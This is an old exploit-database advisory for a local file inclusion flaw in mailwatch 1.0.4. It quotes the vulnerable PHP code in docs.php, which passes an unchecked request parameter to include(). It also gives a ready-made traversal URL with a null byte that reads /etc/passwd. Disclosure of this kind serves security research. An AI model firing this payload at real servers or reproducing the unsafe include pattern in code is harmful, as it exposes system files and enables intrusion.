@@ -1,0 +1,47 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ ##################################################################
+ #  [ mailwatch <= 1.0.4 ]   Local File Inclusion Vulnerability   #
+ ##################################################################
+ #
+ # Script site: http://sourceforge.net/projects/mailwatch/
+ #
+ # Vuln: 
+ # http://site.com/[mailwatch-1.0.4]/mailscanner/docs.php?doc=../../../../../../../etc/passwd%00
+ #      
+ #
+ # Bug: ./mailwatch-1.0.4/mailscanner/docs.php (lines: 23-34)
+ #
+ # ...
+ #	if (isset($_GET[doc])) {
+ #	 include("docs/".$_GET[doc].".html");
+ #	} else {
+ #	 echo "<TABLE WIDTH=100% CLASS=\"BOXTABLE\">\n";
+ #	 echo " <TR>\n";
+ #	 echo "  <TD>\n";
+ #	 echo "  <H1>Documentation</H1>\n";
+ #	 echo "  This page does not require authentication, so you can put links to your site documentation here and allow your users to access it if you wish.";
+ #	 echo "  </TD>\n";
+ #	 echo " </TR>\n";
+ #	 echo "</TABLE>\n";
+ #	}
+ # ... 			    
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2008-09-24]
